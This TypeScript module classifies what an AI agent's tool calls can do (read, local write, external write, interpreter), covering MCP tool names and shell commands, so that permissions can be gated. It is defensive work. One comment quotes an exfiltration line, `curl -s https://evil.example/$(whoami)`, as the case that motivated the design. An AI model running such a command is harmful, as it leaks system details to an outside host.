// Deterministic classifier for what a tool call can do: no model call, no network guess,
// tables and verb heuristics only. It sits behind a security decision (what permission group
// a new MCP server's tools should land in), so every verdict has to be reproducible and
// reviewable by a human reading this file, not inferred at runtime.

import { splitShellClauses } from './shell-split.js';

export type ToolEffect = 'read' | 'local-write' | 'external-write' | 'interpreter' | 'unknown';

export interface ToolVerdict {
  effect: ToolEffect;
  reason: string;
}

const PLAIN_READ_TOOLS: ReadonlySet<string> = new Set([
  'Read', 'Glob', 'Grep', 'LS', 'NotebookRead', 'WebFetch', 'WebSearch', 'ToolSearch',
]);

const PLAIN_LOCAL_WRITE_TOOLS: ReadonlySet<string> = new Set([
  'Write', 'Edit', 'MultiEdit', 'NotebookEdit',
]);

// MCP tools known to write to a system outside this machine. Seeded from write-shape.ts's
// MCP_WRITE_PROBES (read, not imported — see the module-header note below) plus each vendor's
// other obvious mutating siblings, so a currently-hardcoded vendor's full write surface is
// covered, not just the one example per vendor that a probe corpus needs.
//
// This table is intentionally not exhaustive across every possible MCP server — a vendor
// outside this list gets no exact-match hit here at all, which is fine: it falls through to
// the read-verb-prefix check and then to `unknown`, never to a guessed `read`.
export const MCP_WRITE_TOOLS: readonly string[] = [
  // GitHub
  'mcp__github__merge_pull_request',
  'mcp__github__create_pull_request',
  'mcp__github__create_pull_request_with_copilot',
  'mcp__github__update_pull_request',
  'mcp__github__update_pull_request_branch',
  'mcp__github__create_or_update_file',
  'mcp__github__delete_file',
  'mcp__github__push_files',
  'mcp__github__create_branch',
  'mcp__github__create_repository',
  'mcp__github__fork_repository',
  'mcp__github__add_issue_comment',
  'mcp__github__add_comment_to_pending_review',
  'mcp__github__add_reply_to_pull_request_comment',
  'mcp__github__issue_write',
  'mcp__github__sub_issue_write',
  'mcp__github__pull_request_review_write',
  'mcp__github__assign_copilot_to_issue',
  'mcp__github__request_copilot_review',

  // Linear (save_* is Linear's upsert verb; several others were create/delete-shaped siblings)
  'mcp__claude_ai_Linear__save_issue',
  'mcp__claude_ai_Linear__save_comment',
  'mcp__claude_ai_Linear__save_document',
  'mcp__claude_ai_Linear__save_project',
  'mcp__claude_ai_Linear__save_milestone',
  'mcp__claude_ai_Linear__save_release',
  'mcp__claude_ai_Linear__save_release_note',
  'mcp__claude_ai_Linear__save_status_update',
  'mcp__claude_ai_Linear__save_customer',
  'mcp__claude_ai_Linear__save_customer_need',
  'mcp__claude_ai_Linear__save_diff_comment',
  'mcp__claude_ai_Linear__create_issue_label',
  'mcp__claude_ai_Linear__delete_comment',
  'mcp__claude_ai_Linear__delete_attachment',
  'mcp__claude_ai_Linear__delete_customer',
  'mcp__claude_ai_Linear__delete_customer_need',
  'mcp__claude_ai_Linear__delete_diff_comment',
  'mcp__claude_ai_Linear__delete_status_update',
  'mcp__claude_ai_Linear__merge_diff',
  'mcp__claude_ai_Linear__resolve_diff_thread',
  'mcp__claude_ai_Linear__submit_diff_review',

  // Slack
  'mcp__claude_ai_Slack__slack_send_message',
  'mcp__claude_ai_Slack__slack_send_message_draft',
  'mcp__claude_ai_Slack__slack_schedule_message',
  'mcp__claude_ai_Slack__slack_create_canvas',
  'mcp__claude_ai_Slack__slack_update_canvas',

  // Notion
  'mcp__notion__notion-create-pages',
  'mcp__notion__notion-update-page',
  'mcp__notion__notion-create-database',
  'mcp__notion__notion-update-data-source',
  'mcp__notion__notion-create-comment',
  'mcp__notion__notion-create-folder',
  'mcp__notion__notion-update-folder',
  'mcp__notion__notion-create-view',
  'mcp__notion__notion-update-view',
  'mcp__notion__notion-move-pages',
  'mcp__notion__notion-duplicate-page',
  'mcp__notion__notion-create-attachment',
  'mcp__notion__notion-create-file-upload',

  // Grafana — including the verb-agnostic API proxy that reaches every dashboard/datasource
  // write behind one tool name (the Ship 2 audit finding: it cleared write-shape's probe lint
  // only because nobody had probed it yet).
  'mcp__grafana__update_dashboard',
  'mcp__grafana__create_datasource',
  'mcp__grafana__update_datasource',
  'mcp__grafana__create_folder',
  'mcp__grafana__create_annotation',
  'mcp__grafana__update_annotation',
  'mcp__grafana__create_incident',
  'mcp__grafana__add_activity_to_incident',
  'mcp__grafana__create_snapshot',
  'mcp__grafana__delete_snapshot',
  'mcp__grafana__alerting_manage_rules',
  'mcp__grafana__alerting_manage_routing',
  'mcp__grafana__install_plugin',
  'mcp__grafana__grafana_api_request',

  // incident.io
  'mcp__incident-io__incident_create',
  'mcp__incident-io__incident_update',
  'mcp__incident-io__alert_attach',
  'mcp__incident-io__alert_detach',
  'mcp__incident-io__follow_up_create',
  'mcp__incident-io__follow_up_update',
  'mcp__incident-io__escalation_respond',
];

const MCP_WRITE_TOOL_SET: ReadonlySet<string> = new Set(MCP_WRITE_TOOLS);

// Mirrors the anchored read-verb prefixes `pull` already grants in
// config/permission-groups.default.json, so a tool this classifier calls `read` is one the
// existing groups would also have granted as a read. Bare verbs, not literal prefixes: a verb
// must be followed by `_`/`-` or be the entire local name (see matchReadVerb) — a naive
// `startsWith('get_')`-style check would also have let `get_or_create_issue` and
// `search_and_replace` (real compound tool names) read as `read`, which is the bug this whole
// rework closes. See `containsMutationVerb` for the second half of the fix: even a genuine
// verb-prefix match is refused if what follows it names a mutation.
const BASE_READ_VERBS: readonly string[] = ['get', 'list', 'search', 'query', 'find', 'analyze', 'fetch', 'read'];

// Verbs that mean this tool mutates something, checked against a tool's ENTIRE local name once
// a read-verb prefix/suffix has matched — never just the fragment left over after stripping a
// verb or a vendor echo off, since either strip can discard the very segment that names the
// mutation (see the whole-`local`-name scan in classifyTool). `replace` is not one of the
// vendor patterns this table was originally seeded from, but a compound name like
// `search_and_replace` needs it caught the same way `search_and_delete` would be — the fixed
// list is a floor, not a ceiling; add to it rather than assume an unscanned segment is safe.
const MUTATION_VERBS: readonly string[] = [
  'create', 'update', 'delete', 'remove', 'write', 'set', 'send', 'merge', 'push',
  'close', 'archive', 'revoke', 'save', 'post', 'patch', 'upsert', 'modify', 'rename',
  'move', 'duplicate', 'dispatch', 'trigger', 'execute', 'apply', 'install', 'upload', 'replace',
];
const MUTATION_VERB_RE = new RegExp(`\\b(?:${MUTATION_VERBS.join('|')})\\b`, 'i');

function containsMutationVerb(segment: string): boolean {
  return MUTATION_VERB_RE.test(segment.replace(/[-_]/g, ' '));
}

// Splits `mcp__<vendor>__<tool>` into its vendor and tool parts. Some vendors (Notion) echo
// their own name as a literal prefix of every tool name (`notion-fetch`, `notion-search`) —
// stripping that echo is what lets `notion-fetch` match the bare `fetch` verb below instead of
// falling through to `unknown` for looking like it starts with "notion-" instead of a verb.
function mcpParts(toolName: string): { vendor: string; local: string } {
  const rest = toolName.slice('mcp__'.length);
  const sepIdx = rest.indexOf('__');
  return sepIdx === -1
    ? { vendor: '', local: rest }
    : { vendor: rest.slice(0, sepIdx), local: rest.slice(sepIdx + 2) };
}

// Strips a vendor's own name off the front of a tool's local name when the vendor echoes it
// there (Notion's `notion-fetch`/`notion-search`). This ONLY decides whether a read-verb
// prefix/suffix matches — the mutation-verb scan in classifyTool always runs against the
// pre-strip `local` name, specifically so a vendor whose own name is a mutation verb
// (`merge`/`push`/`update`/`delete`/`create` self-prefixing the same way) can't have that
// verb discarded by this function before anything checks it.
function stripVendorEcho(vendor: string, local: string): string {
  const echo = vendor.toLowerCase();
  const lower = local.toLowerCase();
  if (echo && (lower.startsWith(`${echo}-`) || lower.startsWith(`${echo}_`))) {
    return local.slice(echo.length + 1);
  }
  return local;
}

// A verb match requires the verb to be the whole (post-echo-strip) local name, or to be
// followed by `_`/`-` — never just a text prefix. That's what keeps `get_or_create_issue` from
// matching `get` as cleanly as `get_issue` does; both match here as a prefix, and it's the
// whole-name mutation-verb scan in classifyTool — not anything derived from this function —
// that then tells them apart.
function matchesReadVerbPrefix(text: string): boolean {
  const lower = text.toLowerCase();
  return BASE_READ_VERBS.some((verb) =>
    lower === verb || (lower.startsWith(verb) && (lower[verb.length] === '_' || lower[verb.length] === '-')));
}

// A hostile or sloppy MCP server's description must never be trusted to grant `read` — only
// to escalate an otherwise-`unknown` tool toward `external-write` when it plainly announces a
// mutation. "reads data" on a tool named `delete_everything` must stay `unknown`, not become
// `read`; there is no path in this function that produces `read` from a description at all.
const DESCRIBES_WRITE_RE =
  /\b(creates?|updates?|deletes?|removes?|writes?|modifies?|modified|sends?|posts?|publishe[sd]?|merges?|pushe[sd]?|uploads?|destroys?|patche[sd]?|puts?)\b/i;

export function classifyTool(toolName: string, description?: string): ToolVerdict {
  if (PLAIN_READ_TOOLS.has(toolName)) {
    return { effect: 'read', reason: `${toolName} is a built-in read-only tool` };
  }
  if (PLAIN_LOCAL_WRITE_TOOLS.has(toolName)) {
    return { effect: 'local-write', reason: `${toolName} is a built-in local-write tool` };
  }
  if (toolName === 'Bash') {
    return { effect: 'interpreter', reason: 'Bash executes an arbitrary shell command' };
  }

  if (MCP_WRITE_TOOL_SET.has(toolName)) {
    return { effect: 'external-write', reason: `${toolName} is a known external-write MCP tool` };
  }

  if (toolName.startsWith('mcp__')) {
    const { vendor, local } = mcpParts(toolName);
    const verbPart = stripVendorEcho(vendor, local);

    const prefixMatch = matchesReadVerbPrefix(verbPart);
    const lowerVerbPart = verbPart.toLowerCase();
    const suffix = lowerVerbPart.endsWith('_show') ? '_show' : lowerVerbPart.endsWith('_list') ? '_list' : null;

    if (prefixMatch || suffix) {
      // Scan the ORIGINAL, unstripped `local` name — never just the post-strip `verbPart` (or
      // a fragment of it). `stripVendorEcho` discards the vendor-echo segment before this point,
      // so a mutation-verb scan limited to what's left can't see it: a vendor literally named
      // `merge`/`push`/`update`/`delete`/`create` that self-prefixes Notion-style
      // (`merge_get_status`, `push_get_status`) would otherwise have its own name's mutation
      // semantics stripped away right along with the echo. Scanning the whole name means no
      // segment removed by normalisation can carry a mutation verb out of view.
      if (containsMutationVerb(local)) {
        return {
          effect: 'unknown',
          reason: `${toolName} has a read-verb prefix/suffix but its full name ("${local}") `
            + 'names a mutation — refusing to guess read for a compound or vendor-echoed tool name',
        };
      }
      return {
        effect: 'read',
        reason: `${toolName} matches a known read-verb ${prefixMatch ? 'prefix' : 'suffix'}`,
      };
    }
  }

  // Fallback: do not guess beyond the tables above. A wrong `read` here becomes an ungated
  // external write later — the exact failure this classifier exists to prevent — so an
  // unrecognized tool stays `unknown` unless its description plainly escalates it.
  if (description && DESCRIBES_WRITE_RE.test(description)) {
    return {
      effect: 'external-write',
      reason: `${toolName} is unrecognized but its description names a mutation: "${description}"`,
    };
  }
  return { effect: 'unknown', reason: `${toolName} is not in any known table` };
}

const BUILTINS_UNKNOWN: ReadonlySet<string> = new Set([
  'cd', 'env', 'export', 'if', 'true', 'func', 'command', 'echo', 'source', 'set',
]);

const INTERPRETERS: ReadonlySet<string> = new Set([
  'python', 'python3', 'node', 'nodejs', 'ruby', 'perl', 'php', 'osascript',
  'bash', 'sh', 'zsh', 'deno', 'bun', 'sqlite3', 'awk', 'gawk',
]);

const LOCAL_WRITE_BINARIES: ReadonlySet<string> = new Set([
  'mkdir', 'mv', 'cp', 'touch', 'rm', 'rmdir', 'ln', 'chmod',
]);

const READ_BINARIES: ReadonlySet<string> = new Set([
  'ls', 'cat', 'head', 'tail', 'grep', 'rg', 'find', 'wc', 'stat', 'file', 'du',
  'pwd', 'whoami', 'date', 'printenv', 'which', 'type', 'tree', 'sort', 'uniq',
  'cut', 'comm', 'diff', 'cmp', 'column', 'basename', 'dirname', 'realpath', 'nl', 'xxd', 'od',
]);

const GIT_READ_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'status', 'log', 'diff', 'show', 'blame', 'branch', 'remote', 'config', 'fetch',
  'rev-parse', 'merge-base', 'ls-files', 'ls-tree', 'cat-file', 'describe', 'shortlog',
  'show-ref', 'grep',
]);

const GIT_LOCAL_WRITE_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'commit', 'add', 'rm', 'mv', 'checkout', 'merge', 'stash', 'reset', 'restore',
  'cherry-pick', 'revert', 'clean', 'switch', 'apply', 'rebase', 'tag',
]);

function classifyGit(toks: string[]): ToolVerdict {
  const sub = toks[1];
  if (sub === 'push') return { effect: 'external-write', reason: 'git push writes to a remote' };
  if (sub && GIT_READ_SUBCOMMANDS.has(sub)) {
    return { effect: 'read', reason: `git ${sub} is read-only` };
  }
  if (sub && GIT_LOCAL_WRITE_SUBCOMMANDS.has(sub)) {
    return { effect: 'local-write', reason: `git ${sub} mutates the local repo/worktree` };
  }
  return { effect: 'unknown', reason: 'unrecognized git subcommand' };
}

const GH_READ_SUBCOMMAND_PAIRS: ReadonlySet<string> = new Set([
  'pr view', 'pr list', 'pr checks', 'pr diff', 'pr status',
  'run view', 'run list', 'run watch',
  'workflow view', 'workflow list',
  'repo view', 'issue view', 'issue list',
  'release view', 'release list', 'label list', 'cache list',
]);

const GH_WRITE_SUBCOMMAND_PAIRS: ReadonlySet<string> = new Set([
  'pr merge', 'pr create', 'pr comment', 'pr review', 'pr edit', 'pr close', 'pr ready',
  'issue create', 'issue comment', 'issue close',
  'release create', 'repo create', 'repo delete',
  'secret set', 'workflow run', 'cache delete',
]);

function classifyGh(toks: string[], text: string): ToolVerdict {
  const sub = toks[1];
  if (sub === 'search' || sub === 'browse') {
    return { effect: 'read', reason: `gh ${sub} is read-only` };
  }
  if (sub === 'api') {
    if (/(?:-X|--method)\s+(POST|PUT|PATCH|DELETE)/i.test(text)) {
      return { effect: 'external-write', reason: 'gh api names a non-GET HTTP method' };
    }
    return { effect: 'read', reason: 'gh api defaults to GET' };
  }
  const pair = toks.slice(1, 3).join(' ');
  if (GH_READ_SUBCOMMAND_PAIRS.has(pair)) {
    return { effect: 'read', reason: `gh ${pair} is read-only` };
  }
  if (GH_WRITE_SUBCOMMAND_PAIRS.has(pair)) {
    return { effect: 'external-write', reason: `gh ${pair} mutates GitHub` };
  }
  return { effect: 'unknown', reason: 'unrecognized gh subcommand' };
}

const CURL_WRITE_FLAGS_RE =
  /(?:^|\s)(?:-d\b|--data\b|--data-raw\b|--data-binary\b|--data-urlencode\b|-F\b|--form\b|-T\b|--upload-file\b)/;
const CURL_OUTPUT_FLAGS_RE = /(?:^|\s)(?:-o\b|--output\b|-O\b)/;

function classifyCurl(text: string): ToolVerdict {
  const methodMatch = /(?:-X|--request)\s+(\S+)/i.exec(text);
  if (methodMatch && !/^GET$/i.test(methodMatch[1]!)) {
    return { effect: 'external-write', reason: `names a non-GET method (${methodMatch[1]})` };
  }
  if (CURL_WRITE_FLAGS_RE.test(text)) {
    return { effect: 'external-write', reason: 'sends a request body to a remote host' };
  }
  if (CURL_OUTPUT_FLAGS_RE.test(text)) {
    return { effect: 'local-write', reason: 'writes the response to a local file' };
  }
  return { effect: 'read', reason: 'plain fetch with no write-shaped flags' };
}

function classifyNodePkg(toks: string[], binary: string): ToolVerdict {
  const sub = toks[1];
  if (sub === 'publish') {
    return { effect: 'external-write', reason: `${binary} publish uploads a package` };
  }
  if (sub) return { effect: 'local-write', reason: `${binary} ${sub} mutates the local project` };
  return { effect: 'unknown', reason: `bare ${binary} invocation` };
}

function classifyDocker(toks: string[]): ToolVerdict {
  if (toks[1] === 'push') return { effect: 'external-write', reason: 'docker push uploads an image' };
  return { effect: 'unknown', reason: 'unrecognized docker subcommand' };
}

const KUBECTL_READ: ReadonlySet<string> = new Set([
  'get', 'describe', 'logs', 'top', 'version', 'api-resources', 'api-versions',
]);
const KUBECTL_WRITE: ReadonlySet<string> = new Set([
  'apply', 'delete', 'create', 'replace', 'patch', 'scale', 'rollout', 'expose',
]);

function classifyKubectl(toks: string[]): ToolVerdict {
  const sub = toks[1];
  if (sub === 'config' && toks[2] === 'view') {
    return { effect: 'read', reason: 'kubectl config view is read-only' };
  }
  if (sub && KUBECTL_READ.has(sub)) return { effect: 'read', reason: `kubectl ${sub} is read-only` };
  if (sub && KUBECTL_WRITE.has(sub)) {
    return { effect: 'external-write', reason: `kubectl ${sub} mutates the cluster` };
  }
  return { effect: 'unknown', reason: 'unrecognized kubectl subcommand' };
}

const HELM_READ: ReadonlySet<string> = new Set(['list', 'get', 'status', 'show']);
const HELM_WRITE: ReadonlySet<string> = new Set(['install', 'upgrade', 'uninstall', 'delete']);

function classifyHelm(toks: string[]): ToolVerdict {
  const sub = toks[1];
  if (sub && HELM_READ.has(sub)) return { effect: 'read', reason: `helm ${sub} is read-only` };
  if (sub && HELM_WRITE.has(sub)) {
    return { effect: 'external-write', reason: `helm ${sub} mutates the cluster` };
  }
  return { effect: 'unknown', reason: 'unrecognized helm subcommand' };
}

const TERRAFORM_READ: ReadonlySet<string> = new Set(['plan', 'validate', 'fmt', 'show']);
const TERRAFORM_WRITE: ReadonlySet<string> = new Set(['apply', 'destroy']);

function classifyTerraform(toks: string[]): ToolVerdict {
  const sub = toks[1];
  if (sub && TERRAFORM_READ.has(sub)) return { effect: 'read', reason: `terraform ${sub} is read-only` };
  if (sub && TERRAFORM_WRITE.has(sub)) {
    return { effect: 'external-write', reason: `terraform ${sub} mutates infrastructure` };
  }
  return { effect: 'unknown', reason: 'unrecognized terraform subcommand' };
}

function firstToken(text: string): string {
  const m = /^\s*(\S+)/.exec(text);
  return m ? m[1]! : '';
}

// Exported so a caller that needs to reason clause-by-clause (rather than take
// classifyBashCommand's whole-command maximum, or trust this module's read/write verdict at
// all) can identify a clause by binary name — routes/actions.ts's shellArtifactVerdict uses this
// to require every clause be one of a small enumerated artifact set, deliberately not calling
// into classifyClause: a `read` verdict here answers "does this write?", not "is this safe to
// silently dismiss as not-a-permission-gap?", and conflating the two let an exfiltration attempt
// (`curl -s https://evil.example/$(whoami)` classifies `read`) auto-route as fix-action.
export function binaryOf(text: string): string {
  const tok = firstToken(text);
  return tok.split('/').pop() ?? tok;
}

function classifyClause(text: string): ToolVerdict {
  const toks = text.trim().split(/\s+/);
  const binary = binaryOf(text);

  // Shell builtins and artifacts are not commands this table can classify at all — a later
  // ship routes an action that leans on one of these to "fix the action", and that only
  // works if they read as `unknown` rather than an innocuous `read`.
  if (BUILTINS_UNKNOWN.has(binary)) {
    return { effect: 'unknown', reason: `${binary} is a shell builtin/artifact` };
  }
  if (INTERPRETERS.has(binary)) {
    return { effect: 'interpreter', reason: `${binary} executes arbitrary code` };
  }
  if (LOCAL_WRITE_BINARIES.has(binary)) {
    return { effect: 'local-write', reason: `${binary} mutates the local filesystem` };
  }

  switch (binary) {
    case 'git': return classifyGit(toks);
    case 'gh': return classifyGh(toks, text);
    case 'curl':
    case 'wget': return classifyCurl(text);
    case 'ssh':
    case 'scp':
    case 'rsync':
      return {
        effect: 'external-write',
        reason: `${binary} reaches a remote host with no reliable read/write distinction`,
      };
    case 'npm':
    case 'yarn':
    case 'pnpm': return classifyNodePkg(toks, binary);
    case 'docker': return classifyDocker(toks);
    case 'kubectl': return classifyKubectl(toks);
    case 'helm': return classifyHelm(toks);
    case 'terraform': return classifyTerraform(toks);
    default: break;
  }

  if (READ_BINARIES.has(binary)) {
    return { effect: 'read', reason: `${binary} only reads` };
  }
  return { effect: 'unknown', reason: `${binary} is not in any known table` };
}

const EFFECT_SEVERITY: Record<ToolEffect, number> = {
  read: 0,
  unknown: 1,
  'local-write': 2,
  interpreter: 3,
  'external-write': 4,
};

export function classifyBashCommand(command: string): ToolVerdict {
  const clauses = splitShellClauses(command);
  if (!clauses || clauses.length === 0) {
    return { effect: 'unknown', reason: 'command could not be split into clauses' };
  }

  let worst = classifyClause(clauses[0]!.text);
  for (const clause of clauses.slice(1)) {
    const verdict = classifyClause(clause.text);
    if (EFFECT_SEVERITY[verdict.effect] > EFFECT_SEVERITY[worst.effect]) worst = verdict;
  }
  return worst;
}
